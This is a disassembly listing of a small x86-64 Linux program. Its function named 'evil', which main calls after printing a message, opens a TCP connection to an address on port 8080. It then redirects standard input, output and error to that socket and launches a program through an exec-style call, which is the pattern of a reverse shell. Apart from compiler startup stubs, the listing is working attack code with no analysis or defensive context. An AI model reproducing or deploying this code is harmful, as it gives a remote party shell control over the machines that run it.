




_init:
        
        sub     rsp, 8                                  
        mov     rax, qword [rel ?_036]                  
        test    rax, rax                                
        jz      ?_001                                   
        call    rax                                     
?_001:
        add     rsp, 8                                  
        ret                                             



?_002:
        push    qword [rel ?_024]                       
        jmp     near [rel ?_025]                        


?_003:
        jmp     near [rel ?_026]                        

        push    0                                       
        jmp     ?_002                                   

?_004:
        
        jmp     near [rel ?_027]                        

        push    1                                       
        jmp     ?_002                                   

?_005:
        
        jmp     near [rel ?_028]                        

        push    2                                       
        jmp     ?_002                                   

?_006:
        
        jmp     near [rel ?_029]                        

        push    3                                       
        jmp     ?_002                                   

?_007:
        
        jmp     near [rel ?_030]                        

        push    4                                       
        jmp     ?_002                                   

?_008:
        
        jmp     near [rel ?_031]                        

        push    5                                       
        jmp     ?_002                                   

?_009:
        
        jmp     near [rel ?_032]                        

        push    6                                       
        jmp     ?_002                                   

?_010:
        
        jmp     near [rel ?_033]                        

        push    7                                       
        jmp     ?_002                                   



?_011:
        jmp     near [rel ?_038]                        





_start:
       
        xor     ebp, ebp                                
        mov     r9, rdx                                 
        pop     rsi                                     
        mov     rdx, rsp                                
        and     rsp, 0FFFFFFFFFFFFFFF0H                 
        push    rax                                     
        push    rsp                                     
        lea     r8, [rel __libc_csu_fini]               
        lea     rcx, [rel __libc_csu_init]              
        lea     rdi, [rel main]                         
        call    near [rel ?_035]                        
        hlt                                             

deregister_tm_clones:
        lea     rdi, [rel _edata]                       
        push    rbp                                     
        lea     rax, [rel _edata]                       
        cmp     rax, rdi                                
        mov     rbp, rsp                                
        jz      ?_012                                   
        mov     rax, qword [rel ?_034]                  
        test    rax, rax                                
        jz      ?_012                                   
        pop     rbp                                     
        jmp     rax                                     


?_012:
        pop     rbp                                     
        ret                                             



register_tm_clones:
        lea     rdi, [rel _edata]                       
        lea     rsi, [rel _edata]                       
        push    rbp                                     
        sub     rsi, rdi                                
        mov     rbp, rsp                                
        sar     rsi, 3                                  
        mov     rax, rsi                                
        shr     rax, 63                                 
        add     rsi, rax                                
        sar     rsi, 1                                  
        jz      ?_013                                   
        mov     rax, qword [rel ?_037]                  
        test    rax, rax                                
        jz      ?_013                                   
        pop     rbp                                     
        jmp     rax                                     


?_013:
        pop     rbp                                     
        ret                                             



        cmp     byte [rel _edata], 0                    
        jnz     ?_015                                   
        cmp     qword [rel ?_038], 0                    
        push    rbp                                     
        mov     rbp, rsp                                
        jz      ?_014                                   
        mov     rdi, qword [rel __dso_handle]           
        call    ?_011                                   
?_014:
        call    deregister_tm_clones                    
        mov     byte [rel _edata], 1                    
        pop     rbp                                     
        ret                                             


?_015:
        DB      0F3H                                    
        ret                                             



frame_dummy:
        push    rbp                                     
        mov     rbp, rsp                                
        pop     rbp                                     
        jmp     register_tm_clones                      

evil:
         
        push    rbp                                     
        mov     rbp, rsp                                
        sub     rsp, 48                                 
        mov     rax, qword [fs:abs 28H]                 
        mov     qword [rbp-8H], rax                     
        xor     eax, eax                                
        mov     word [rbp-20H], 2                       
        lea     rdi, [rel ?_019]                        
        call    ?_007                                   
        mov     dword [rbp-1CH], eax                    
        mov     edi, 8080                               
        call    ?_005                                   
        mov     word [rbp-1EH], ax                      
        mov     edx, 0                                  
        mov     esi, 1                                  
        mov     edi, 2                                  
        call    ?_010                                   
        mov     dword [rbp-24H], eax                    
        lea     rcx, [rbp-20H]                          
        mov     eax, dword [rbp-24H]                    
        mov     edx, 16                                 
        mov     rsi, rcx                                
        mov     edi, eax                                
        call    ?_008                                   
        mov     eax, dword [rbp-24H]                    
        mov     esi, 0                                  
        mov     edi, eax                                
        call    ?_006                                   
        mov     eax, dword [rbp-24H]                    
        mov     esi, 1                                  
        mov     edi, eax                                
        call    ?_006                                   
        mov     eax, dword [rbp-24H]                    
        mov     esi, 2                                  
        mov     edi, eax                                
        call    ?_006                                   
        mov     r8d, 0                                  
        mov     ecx, 0                                  
        lea     rdx, [rel ?_020]                        
        lea     rsi, [rel ?_021]                        
        lea     rdi, [rel ?_022]                        
        mov     eax, 0                                  
        call    ?_009                                   
        nop                                             
        mov     rax, qword [rbp-8H]                     
        xor     rax, qword [fs:abs 28H]                 
        jz      ?_016                                   
        call    ?_004                                   
?_016:
        leave                                           
        ret                                             

main:
         
        push    rbp                                     
        mov     rbp, rsp                                
        lea     rdi, [rel ?_023]                        
        call    ?_003                                   
        mov     eax, 0                                  
        call    evil                                    
        mov     eax, 0                                  
        pop     rbp                                     
        ret                                             

__libc_csu_init:
        push    r15                                     
        push    r14                                     
        mov     r15, rdx                                
        push    r13                                     
        push    r12                                     
        lea     r12, [rel __frame_dummy_init_array_entry]
        push    rbp                                     
        push    rbx                                     
        mov     r13d, edi                               
        mov     r14, rsi                                
        sub     rbp, r12                                
        sub     rsp, 8                                  
        sar     rbp, 3                                  
        call    _init                                   
        test    rbp, rbp                                
        jz      ?_018                                   
        xor     ebx, ebx                                

?_017:
        mov     rdx, r15                                
        mov     rsi, r14                                
        mov     edi, r13d                               
        call    near [r12+rbx*8]                        
        add     rbx, 1                                  
        cmp     rbp, rbx                                
        jnz     ?_017                                   
?_018:
        add     rsp, 8                                  
        pop     rbx                                     
        pop     rbp                                     
        pop     r12                                     
        pop     r13                                     
        pop     r14                                     
        pop     r15                                     
        ret                                             

        nop                                             


__libc_csu_fini:
        DB      0F3H                                    
        ret                                             



_fini:
        
        sub     rsp, 8                                  
        add     rsp, 8                                  
        ret                                             


